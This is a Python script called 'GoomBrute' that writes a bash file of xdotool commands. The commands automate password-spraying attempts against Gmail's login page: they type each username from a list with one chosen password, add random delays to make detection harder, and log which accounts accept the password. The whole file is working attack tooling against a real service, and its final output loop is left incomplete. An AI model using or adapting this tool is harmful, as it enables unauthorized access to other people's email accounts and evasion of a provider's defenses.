#!/usr/bin/env python
# coding: utf


# GoomBrute is for brute forcing Gmail login windows via xdotool. 
# This script will generate a bash script for running xdotool commands.
# Run the output sh file in the appropriate environment.

########################################################################

_DEV_ = True

from random import randrange # to generate noise
from pathlib import Path # to handle files

# OPTIONS
user_list = "users.txt"
password = "PUT PASSWORD HERE"

# For testing's sake:
path = Path("password.txt")
if path.is_file() and _DEV_ == True:
    with open("password.txt",'r') as pass_file:
        password = pass_file.readline()
        password = "".join(password.split())
        


target_filename = "xdobrute.sh"
delay = 3 # seconds
target_url = "gmail.com"

# Browser search bar "x y"coordinates
search = "1011 95"

# Sign in button "x y" coordinates
sign_in = "1082 143"

# Username login field "x y" coordinates
user_field = "818 427"

# Password field "x y" coordinates
password_field = "820 454"

# Blank area "x y" coordinates
blank = "713 182"

source = "922 346"

output_dir = "GoomBruteOutput"

clear_ext = "1213 93"

all_data = "988 191"

# Generates a value for creating noise between request delays.
# This is a function instead of a variable so that a new random
# is generated upon each call.
def add_noise():
    return randrange(0, 15)/10

# Sets the request delay.
def wait_load():
    return 3


# Load the usernames from file into a list.
print(f"Loading username file '{user_list}'...")
usernames = []
with open(user_list, "r") as user_file:
    for line in user_file:
        usernames.append(line)
print("Here are the first few usernames: " + str(usernames[0:5]))


print("Creating xdotool sh command list...")

commands = []

for user in usernames:
    # Navigate to the desired login portal'
    user = "".join(user.split())
    commands.append(f"xdotool mousemove {search} click 1 key ctrl+a")
    commands.append("xdotool key 'Delete'")
    commands.append(f"xdotool mousemove {search} click 1 type '{target_url}'")
    commands.append(f"xdotool mousemove {search} key 'Return'")
    commands.append(f"sleep {wait_load() + add_noise()}")
    commands.append(f"xdotool mousemove {sign_in} click 1")
    commands.append(f"sleep {wait_load() + add_noise()}")
    
    
    # Navigate the username entry page
    commands.append(f"xdotool mousemove {user_field} click 1 key ctrl+a") # clears field
    commands.append("xdotool key 'Delete'")
    commands.append(f"xdotool mousemove {user_field} click 1 type '{user}'") # inputs username
    commands.append(f"xdotool mousemove {user_field} click 1 key 'Return'") # submits username

    commands.append(f"sleep {wait_load() + add_noise()}")

    # Navigate the password entry page
    commands.append(f"xdotool mousemove {password_field} click 1 key ctrl+a")
    commands.append("xdotool key 'Delete'")
    commands.append(f"xdotool mousemove {password_field} click 1 type '{password}'")
    commands.append(f"xdotool mousemove {password_field} click 1 key 'Return'")
    
    commands.append(f"sleep {wait_load() + add_noise()}")
    
    # Save page results
    commands.append(f"xdotool mousemove {blank} click 1 key ctrl+a")
    
    name = user.split("@")[0]
    commands.append(f"xclip -o > \"{output_dir}/{name}.txt\"")

    # Add a delay
    commands.append(f"sleep {delay}")
    
    commands.append(f"sleep {wait_load()}")
    commands.append(f"xdotool mousemove {all_data} click 1")
    
    # Process page result.
    # Check whether a wrong password was submitted.
    commands.append(f"result=`cat {output_dir}/{name}.txt | grep -i 'Wrong password. Try again' | wc -c`")
    commands.append("if [ $result -eq 0 ]")
    commands.append("then")
    commands.append("incorrect_pass=false")
    commands.append("else")
    commands.append("incorrect_pass=true")
    commands.append("fi")
    
    # Check whether a show password option exists.
    commands.append(f"result=`cat {output_dir}/{name}.txt | grep -i 'show password' | wc -c`")
    commands.append("if [ $result -eq 0 ]")
    commands.append("then")
    commands.append("show_pass=false")
    commands.append("else")
    commands.append("show_pass=true")
    commands.append("fi")
    
    # Determine whether the login was successful.
    commands.append("if [ $show_pass = true ] || [ $incorrect_pass = true ]")
    commands.append("then")
    commands.append("success=false")
    commands.append("else")
    commands.append("success=true")
    commands.append("fi")
    
    commands.append("if [ $success = true ]")
    commands.append("then")
    commands.append(f"echo \"{user} Success {password}\" >> {output_dir}/results.txt")
    commands.append("exit")
    commands.append("else")
    commands.append(f"echo \"{user} Failure\" >> {output_dir}/results.txt")
    commands.append("fi")
    
# Process raw output into a readable, exportable results file
process_output = []
process_output.append(f"for file in `ls {output_dir}`")
process_output.append("do")



# Write the executable bash script.
print(f"Writing to '{target_filename}'...\n")
with open(target_filename, 'w') as output_file:
    print('#!/bin/bash')
    output_file.write("#!/bin/bash\n")
    output_file.write(f"mkdir {output_dir}\n")
    for line in commands:
        print(line)
        output_file.write(line)
        output_file.write('\n')
        
    for line in process_output:
        print(line)
        output_file.write(line)
        output_file.write('\n')

